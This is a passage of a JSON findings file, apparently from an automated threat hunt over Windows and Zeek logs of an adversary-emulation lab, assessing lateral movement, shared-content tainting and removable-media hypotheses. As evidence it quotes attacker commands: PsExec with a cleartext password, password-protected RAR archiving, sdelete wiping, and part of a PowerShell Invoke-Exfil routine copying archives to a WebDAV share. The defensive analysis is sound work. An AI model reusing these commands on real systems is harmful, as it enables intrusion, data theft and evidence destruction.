+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxpAy5",
+          "field": "process.executable",
+          "claimed": "C:\\Windows\\System32\\javamtsup.exe",
+          "query_id": "q-849c3b3ee9",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-849c3b3ee9",
+            "q-f5daff3242"
+          ],
+          "actual": "C:\\Windows\\System32\\javamtsup.exe",
+          "timestamp": "2020-05-02T03:19:14.118Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuDg",
+          "field": "message",
+          "claimed": "Service Name:  Java(TM) Virtual Machine Support Service\r\nService File Name:  C:\\Windows\\System32\\javamtsup.exe",
+          "query_id": "q-79877b0035",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-9276a6f139",
+            "q-79877b0035",
+            "q-a392280f3a",
+            "q-938cf68f34",
+            "q-fe4a0971ab"
+          ],
+          "actual": "A service was installed in the system.\r\n\r\nService Name:  Java(TM) Virtual Machine Support Service\r\nService File Name:  C:\\Windows\\System32\\javamtsup.exe\r\nService Type:  user mode service\r\nService Start Type:  auto start\r\nService Account:  LocalSystem",
+          "timestamp": "2020-05-01T23:04:15.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.other"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 3
+    },
+    {
+      "assessment": "benign",
+      "confidence": "medium",
+      "evidence": [
+        {
+          "field": "win.AccessMask",
+          "id": "AaFZRvJfH5wFd7ns-ApD",
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "query_id": "q-1fdfadec32",
+          "value": "0x100081"
+        },
+        {
+          "field": "win.RelativeTargetName",
+          "id": "AaFZRvJfH5wFd7ns-ApD",
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "query_id": "q-1fdfadec32",
+          "value": "dmevals.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine"
+        },
+        {
+          "field": "win.ShareName",
+          "id": "AaFZRvJfH5wFd7ns-ApD",
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "query_id": "q-1fdfadec32",
+          "value": "\\\\*\\SYSVOL"
+        },
+        {
+          "field": "win.ShareName",
+          "id": "AaFZRvJfH5wFd7rxEjIW",
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "query_id": "q-4502c1a1f3",
+          "value": "\\\\*\\SYSVOL"
+        },
+        {
+          "field": "win.ImagePath",
+          "id": "AaFZR_JfH5wFd7pNHuDg",
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "query_id": "q-da75090822",
+          "value": "C:\\Windows\\System32\\javamtsup.exe"
+        },
+        {
+          "field": "win.ImagePath",
+          "id": "AaFZR_JfH5wFd7pNHuCk",
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "query_id": "q-da75090822",
+          "value": "%SystemRoot%\\PSEXESVC.exe"
+        },
+        {
+          "field": "win.ScriptBlockText",
+          "id": "AaFZR_JfH5wFd7qjPglL",
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "query_id": "q-49167d2324",
+          "value": "Copy-Item \"$env:APPDATA\\OfficeSupplies.7z\" \"WebDavShare:\\OfficeSupplies.7z\" -Force"
+        },
+        {
+          "field": "file.path",
+          "id": "AaFZRvJfH5wFd7hx0G9q",
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "query_id": "q-25c81b3109",
+          "value": "C:\\Users\\pbeesly\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0gslifez.da2.ps1"
+        }
+      ],
+      "summary": "Across 2020-05-02 02:55-03:28Z on newyork/nashua/scranton/utica.dmevals.local, all 121 event.code 5145 share-access events and 42 event.code 5140 share-connect events resolve to SYSVOL (56/13), IPC$ (45/20) and ADMIN$ (20/9). Every SYSVOL access carries read-only masks (0x100081 SYNCHRONIZE/ReadData/ReadAttributes, 0x120089) against GPO paths such as dmevals.local\\Policies\\{31B2F340-...}\\Machine and gpt.ini, performed by machine accounts NEWYORK$, SCRANTON$, NASHUA$ and UTICA$. The non-overlapping Zeek window (2020-04-30 00:06-00:45Z) shows the same pattern from the network side: all 12 smb_files records are SMB::FILE_OPEN on \\\\NEWYORK.dmevals.local\\sysvol (gpt.ini, GptTmpl.inf) with no write, rename or delete actions. No file was written into SYSVOL or any other share, so shared content was not tainted. The only share writes observed are pbeesly from 10.0.1.4 (scranton) writing PSEXESVC.exe and Temp\\python.exe into nashua's ADMIN$ with mask 0x2 (WriteData/AddFile) at 03:10-03:18Z, accompanied by PSEXESVC service installs (7045) and PSEXESVC stdin/stdout/stderr pipes - that is PsExec-style remote execution (T1021.002/T1569.002), not T1080. Sysmon event.code 11 file creations contain no UNC/network paths (all local Prefetch, ServiceState, DFSR config and user temp files), and the single PowerShell 4104 hit is an Invoke-Exfil routine that maps \\\\192.168.0.4\\webdav and copies OfficeSupplies.7z out (exfiltration), not content placed on a share for other users to execute.",
+      "technique": "T1080",
+      "title": "No tainted shared content: SYSVOL/ADMIN$ access is read-only GPO reads plus PsExec service drops, not writes to shared content",
+      "verification": [
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7ns-ApD",
+          "field": "win.AccessMask",
+          "claimed": "0x100081",
+          "query_id": "q-1fdfadec32",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-4502c1a1f3",
+            "q-d67e250095",
+            "q-27922b6776",
+            "q-1fdfadec32",
+            "q-5c50d1b0d2"
+          ],
+          "actual": "0x100081",
+          "timestamp": "2020-05-01T23:01:43.000-04:00",
+          "host": "newyork.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7ns-ApD",
+          "field": "win.RelativeTargetName",
+          "claimed": "dmevals.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine",
+          "query_id": "q-1fdfadec32",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-4502c1a1f3",
+            "q-d67e250095",
+            "q-27922b6776",
+            "q-1fdfadec32",
+            "q-5c50d1b0d2"
+          ],
+          "actual": "dmevals.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine",
+          "timestamp": "2020-05-01T23:01:43.000-04:00",
+          "host": "newyork.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7ns-ApD",
+          "field": "win.ShareName",
+          "claimed": "\\\\*\\SYSVOL",
+          "query_id": "q-1fdfadec32",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-4502c1a1f3",
+            "q-d67e250095",
+            "q-27922b6776",
+            "q-1fdfadec32",
+            "q-5c50d1b0d2"
+          ],
+          "actual": "\\\\*\\SYSVOL",
+          "timestamp": "2020-05-01T23:01:43.000-04:00",
+          "host": "newyork.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7rxEjIW",
+          "field": "win.ShareName",
+          "claimed": "\\\\*\\SYSVOL",
+          "query_id": "q-4502c1a1f3",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-4502c1a1f3",
+            "q-d67e250095",
+            "q-27922b6776",
+            "q-a0de3a7546",
+            "q-c1122635e1"
+          ],
+          "actual": "\\\\*\\SYSVOL",
+          "timestamp": "2020-05-01T22:56:47.000-04:00",
+          "host": "newyork.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuDg",
+          "field": "win.ImagePath",
+          "claimed": "C:\\Windows\\System32\\javamtsup.exe",
+          "query_id": "q-da75090822",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-9276a6f139",
+            "q-79877b0035",
+            "q-a392280f3a",
+            "q-938cf68f34",
+            "q-fe4a0971ab"
+          ],
+          "actual": "C:\\Windows\\System32\\javamtsup.exe",
+          "timestamp": "2020-05-01T23:04:15.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.other"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuCk",
+          "field": "win.ImagePath",
+          "claimed": "%SystemRoot%\\PSEXESVC.exe",
+          "query_id": "q-da75090822",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-9276a6f139",
+            "q-79877b0035",
+            "q-a392280f3a",
+            "q-938cf68f34",
+            "q-fe4a0971ab"
+          ],
+          "actual": "%SystemRoot%\\PSEXESVC.exe",
+          "timestamp": "2020-05-01T23:11:39.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.other"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qjPglL",
+          "field": "win.ScriptBlockText",
+          "claimed": "Copy-Item \"$env:APPDATA\\OfficeSupplies.7z\" \"WebDavShare:\\OfficeSupplies.7z\" -Force",
+          "query_id": "q-49167d2324",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-c1952cb2f9",
+            "q-ac6eafecf1",
+            "q-78a48e82cb",
+            "q-49167d2324",
+            "q-1a81738021"
+          ],
+          "actual": "function Invoke-Exfil {\n\n    if (!(Get-Module -Name \"7Zip4Powershell\")) { Write-Host \"[*] Installing 7Zip4Powershell module\"; Install-Module -Name 7Zip4Powershell -Force }\n\n    Write-Host \"[*] Compressing all the things in download dir\"\n    Compress-7Zip -Path \"$env:USERPROFILE\\Downloads\\\" -Filter * -Password \"lolol\" -ArchiveFileName \"$env:APPDATA\\OfficeSupplies.7z\"\n\n    $UserName = \"cozy\"\n    $Password = \"MyCozyPassw0rd!\" | ConvertTo-SecureString -AsPlainText -Force\n    $Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $UserName, $Password\n\n    $WebDavShare...(truncated)",
+          "timestamp": "2020-05-01T23:08:02.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.powershell"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7hx0G9q",
+          "field": "file.path",
+          "claimed": "C:\\Users\\pbeesly\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0gslifez.da2.ps1",
+          "query_id": "q-25c81b3109",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-25c81b3109",
+            "q-84088601cf"
+          ],
+          "actual": "C:\\Users\\pbeesly\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0gslifez.da2.ps1",
+          "timestamp": "2020-05-02T02:56:14.969Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 8
+    },
+    {
+      "technique": "T1091",
+      "title": "No removable-media replication observed; D:/F: volume writes are fixed-disk DFSR and pagefile activity",
+      "assessment": "benign",
+      "confidence": "high",
+      "summary": "The T1091 hypothesis is not supported. The only file-creation events on non-C: drive letters in windows.sysmon are (a) 14 writes by C:\\windows\\system32\\DFSRs.exe to F:\\System Volume Information\\DFSR\\Config\\*.XML.TMP on newyork.dmevals.local between 02:56:48Z and 03:26:49Z, which is normal DFS Replication staging on a fixed volume, and (b) one write of D:\\pagefile.sys by C:\\windows\\System32\\smss.exe on scranton.dmevals.local at 03:19:09Z, which is normal pagefile creation at boot. windows.other volume-health events (code 98) confirm C:, D: and \\\\?\\Volume{d1b3f076-...} are \\Device\\HarddiskVolume* fixed disks, not removable media. No USB device, removable-volume or drive-letter insertion events were found in windows.other, and the Sysinternals Volumeid.exe files seen on scranton were written to C:\\Users\\pbeesly\\Downloads, not to removable media. The Zeek dataset (2020-04-30) does not overlap the Windows window and contains no removable-media telemetry.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7hwyqf3",
+          "field": "file.path",
+          "value": "F:\\System Volume Information\\DFSR\\Config\\Volume_6936845B-3943-400C-B266-FE6A00502C0C.XML.TMP",
+          "query_id": "q-c47e14bcbe"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7hwyqf3",
+          "field": "process.executable",
+          "value": "C:\\windows\\system32\\DFSRs.exe",
+          "query_id": "q-b231f629b9"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxqOiA",
+          "field": "file.path",
+          "value": "D:\\pagefile.sys",
+          "query_id": "q-c47e14bcbe"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxqOiA",
+          "field": "process.executable",
+          "value": "C:\\windows\\System32\\smss.exe",
+          "query_id": "q-c47e14bcbe"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuA7",
+          "field": "message",
+          "value": "Volume D: (\\Device\\HarddiskVolume3) is healthy.  No action is needed.",
+          "query_id": "q-9335b641ac"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7hbcHo-",
+          "field": "file.path",
+          "value": "C:\\Users\\pbeesly\\Downloads\\SysinternalsSuite\\Volumeid64.exe",
+          "query_id": "q-07cc99e24b"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7hwyqf3",
+          "field": "file.path",
+          "claimed": "F:\\System Volume Information\\DFSR\\Config\\Volume_6936845B-3943-400C-B266-FE6A00502C0C.XML.TMP",
+          "query_id": "q-c47e14bcbe",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-25c81b3109",
+            "q-c47e14bcbe",
+            "q-07cc99e24b",
+            "q-b231f629b9",
+            "q-df1fec87b4"
+          ],
+          "actual": "F:\\System Volume Information\\DFSR\\Config\\Volume_6936845B-3943-400C-B266-FE6A00502C0C.XML.TMP",
+          "timestamp": "2020-05-02T02:56:48.208Z",
+          "host": "newyork.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7hwyqf3",
+          "field": "process.executable",
+          "claimed": "C:\\windows\\system32\\DFSRs.exe",
+          "query_id": "q-b231f629b9",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-25c81b3109",
+            "q-c47e14bcbe",
+            "q-07cc99e24b",
+            "q-b231f629b9",
+            "q-df1fec87b4"
+          ],
+          "actual": "C:\\windows\\system32\\DFSRs.exe",
+          "timestamp": "2020-05-02T02:56:48.208Z",
+          "host": "newyork.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxqOiA",
+          "field": "file.path",
+          "claimed": "D:\\pagefile.sys",
+          "query_id": "q-c47e14bcbe",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-c47e14bcbe",
+            "q-07cc99e24b",
+            "q-b5dfd93a16",
+            "q-b748a1cf7f"
+          ],
+          "actual": "D:\\pagefile.sys",
+          "timestamp": "2020-05-02T03:19:09.192Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxqOiA",
+          "field": "process.executable",
+          "claimed": "C:\\windows\\System32\\smss.exe",
+          "query_id": "q-c47e14bcbe",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-c47e14bcbe",
+            "q-07cc99e24b",
+            "q-b5dfd93a16",
+            "q-b748a1cf7f"
+          ],
+          "actual": "C:\\windows\\System32\\smss.exe",
+          "timestamp": "2020-05-02T03:19:09.192Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuA7",
+          "field": "message",
+          "claimed": "Volume D: (\\Device\\HarddiskVolume3) is healthy.  No action is needed.",
+          "query_id": "q-9335b641ac",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-9335b641ac",
+            "q-270d2c49a9"
+          ],
+          "actual": "Volume D: (\\Device\\HarddiskVolume3) is healthy.  No action is needed.",
+          "timestamp": "2020-05-01T23:19:05.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.other"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7hbcHo-",
+          "field": "file.path",
+          "claimed": "C:\\Users\\pbeesly\\Downloads\\SysinternalsSuite\\Volumeid64.exe",
+          "query_id": "q-07cc99e24b",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-07cc99e24b",
+            "q-439cdf3309"
+          ],
+          "actual": "C:\\Users\\pbeesly\\Downloads\\SysinternalsSuite\\Volumeid64.exe",
+          "timestamp": "2020-05-02T03:00:28.158Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 6
+    },
+    {
+      "technique": "T1091",
+      "title": "Lateral movement present in the data is PsExec over SMB (not removable media) from scranton to nashua",
+      "assessment": "malicious",
+      "confidence": "high",
+      "summary": "While hunting T1091 I found that the actual lateral movement in this window is network-based, not removable-media based: user pbeesly on scranton.dmevals.local repeatedly ran C:\\Program Files\\SysinternalsSuite\\PsExec64.exe with the cleartext credential -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by against \\\\NASHUA to launch C:\\Windows\\Temp\\python.exe (03:11:18Z, 03:12:25Z, 03:13:28Z, 03:14:42Z). On nashua.dmevals.local, C:\\Windows\\PSEXESVC.exe was created by services.exe and spawned C:\\Windows\\Temp\\python.exe as pbeesly, followed by C:\\Windows\\Temp\\Rar.exe archiving working.zip with password -hpfGzq5yKw and sdelete64.exe wiping Rar.exe, working.zip and Draft.Zip. This is malicious lateral movement/execution, but it is T1021.002/T1570-style SMB service execution, not T1091 replication through removable media, so it does not substantiate the T1091 hypothesis.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxoQzx",
+          "field": "process.command_line",
+          "value": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-762b97d6aa"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cwoB6l",
+          "field": "process.parent.executable",
+          "value": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-762b97d6aa"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c4xY6Y",
+          "field": "process.command_line",
+          "value": "\"C:\\Windows\\Temp\\Rar.exe\" a -hpfGzq5yKw C:\\Users\\pbeesly\\Desktop\\working.zip C:\\Users\\pbeesly\\AppData\\Roaming\\working.zip",
+          "query_id": "q-762b97d6aa"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c1t6d3",
+          "field": "process.command_line",
+          "value": ".\\sdelete64.exe  /accepteula \"C:\\Users\\pbeesly\\Desktop\\working.zip\"",
+          "query_id": "q-762b97d6aa"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNuP",
+          "field": "process.executable",
+          "value": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-f31bc56ccf"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxoQzx",
+          "field": "process.command_line",
+          "claimed": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-762b97d6aa",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-839fccd30f",
+            "q-dad3c51741",
+            "q-eedf0bc97a",
+            "q-da306f3cd9",
+            "q-9858c70456"
+          ],
+          "actual": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "timestamp": "2020-05-02T03:11:18.784Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cwoB6l",
+          "field": "process.parent.executable",
+          "claimed": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-762b97d6aa",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-10e292fc55",
+            "q-6c06613c3e",
+            "q-762b97d6aa",
+            "q-6021cb938d",
+            "q-ebede971ad"
+          ],
+          "actual": "C:\\Windows\\PSEXESVC.exe",
+          "timestamp": "2020-05-02T03:12:46.846Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c4xY6Y",
+          "field": "process.command_line",
+          "claimed": "\"C:\\Windows\\Temp\\Rar.exe\" a -hpfGzq5yKw C:\\Users\\pbeesly\\Desktop\\working.zip C:\\Users\\pbeesly\\AppData\\Roaming\\working.zip",
+          "query_id": "q-762b97d6aa",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-762b97d6aa",
+            "q-3e9145f23a"
+          ],
+          "actual": "\"C:\\Windows\\Temp\\Rar.exe\" a -hpfGzq5yKw C:\\Users\\pbeesly\\Desktop\\working.zip C:\\Users\\pbeesly\\AppData\\Roaming\\working.zip",
+          "timestamp": "2020-05-02T03:16:19.395Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c1t6d3",
+          "field": "process.command_line",
+          "claimed": ".\\sdelete64.exe  /accepteula \"C:\\Users\\pbeesly\\Desktop\\working.zip\"",
+          "query_id": "q-762b97d6aa",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-762b97d6aa",
+            "q-fe355249b1",
+            "q-cd1a654ba3",
+            "q-4edda752cc"
+          ],
+          "actual": ".\\sdelete64.exe  /accepteula \"C:\\Users\\pbeesly\\Desktop\\working.zip\"",
+          "timestamp": "2020-05-02T03:17:41.290Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNuP",
+          "field": "process.executable",
+          "claimed": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-f31bc56ccf",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-8d3838fe54",
+            "q-f31bc56ccf",
+            "q-f540a1456e"
+          ],
+          "actual": "C:\\Windows\\PSEXESVC.exe",
+          "timestamp": "2020-05-01T23:11:39.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.security"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 5
+    },
+    {
+      "technique": "T1210",
+      "title": "WinRM (port 5985) remote-service access from compromised SCRANTON to NASHUA under user pbeesly",
+      "assessment": "malicious",
+      "confidence": "high",
+      "summary": "On 2020-05-02 between 03:09:23 and 03:09:29 UTC, PowerShell (C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe) running as pbeesly on scranton.dmevals.local (10.0.1.4) made four outbound connections to 10.0.1.6 on port 5985 (WinRM). At 03:09:23.885 the same second, nashua.dmevals.local spawned wsmprovhost.exe -Embedding as pbeesly, i.e. the WinRM remote shell was established on the target. windows.security corroborates with Kerberos network logons (LogonType 3) for pbeesly on nashua.dmevals.local sourced from 10.0.1.4 at 23:10:23, 23:11:18, 23:12:25 and 23:13:28 local time. This is remote-service access to a second host, not normal System/SMB traffic (SMB to 10.0.0.4 was exclusively process 'System').",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c-4MbN",
+          "field": "destination.port",
+          "value": "5985",
+          "query_id": "q-64cc0e0433"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c-4MbN",
+          "field": "process.executable",
+          "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "query_id": "q-64cc0e0433"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c-4MbN",
+          "field": "win.SourceIp",
+          "value": "10.0.1.4",
+          "query_id": "q-64cc0e0433"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c-4cYK",
+          "field": "process.command_line",
+          "value": "C:\\windows\\system32\\wsmprovhost.exe -Embedding",
+          "query_id": "q-4572768bb8"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niytuv",
+          "field": "win.IpAddress",
+          "value": "10.0.1.4",
+          "query_id": "q-4ffcea3e4d"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niytuv",
+          "field": "win.LogonType",
+          "value": "3",
+          "query_id": "q-4ffcea3e4d"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c-4MbN",
+          "field": "destination.port",
+          "claimed": "5985",
+          "query_id": "q-64cc0e0433",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ae21c33f08",
+            "q-809481db0a",
+            "q-a95c00adfc",
+            "q-c6c158acd1",
+            "q-4902e7de68"
+          ],
+          "actual": 5985,
+          "timestamp": "2020-05-02T03:09:23.801Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c-4MbN",
+          "field": "process.executable",
+          "claimed": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "query_id": "q-64cc0e0433",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ae21c33f08",
+            "q-809481db0a",
+            "q-a95c00adfc",
+            "q-c6c158acd1",
+            "q-4902e7de68"
+          ],
+          "actual": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "timestamp": "2020-05-02T03:09:23.801Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c-4MbN",
+          "field": "win.SourceIp",
+          "claimed": "10.0.1.4",
+          "query_id": "q-64cc0e0433",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ae21c33f08",
+            "q-809481db0a",
+            "q-a95c00adfc",
+            "q-c6c158acd1",
+            "q-4902e7de68"
+          ],
+          "actual": "10.0.1.4",
+          "timestamp": "2020-05-02T03:09:23.801Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c-4cYK",
+          "field": "process.command_line",
+          "claimed": "C:\\windows\\system32\\wsmprovhost.exe -Embedding",
+          "query_id": "q-4572768bb8",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ebede971ad",
+            "q-4572768bb8",
+            "q-67369fb0fd"
+          ],
+          "actual": "C:\\windows\\system32\\wsmprovhost.exe -Embedding",
+          "timestamp": "2020-05-02T03:09:23.885Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niytuv",
+          "field": "win.IpAddress",
+          "claimed": "10.0.1.4",
+          "query_id": "q-4ffcea3e4d",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-846ac30166",
+            "q-4ffcea3e4d",
+            "q-a9456e8993",
+            "q-57d7b9d6bd",
+            "q-848f614b5e"
+          ],
+          "actual": "10.0.1.4",
+          "timestamp": "2020-05-01T23:10:23.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
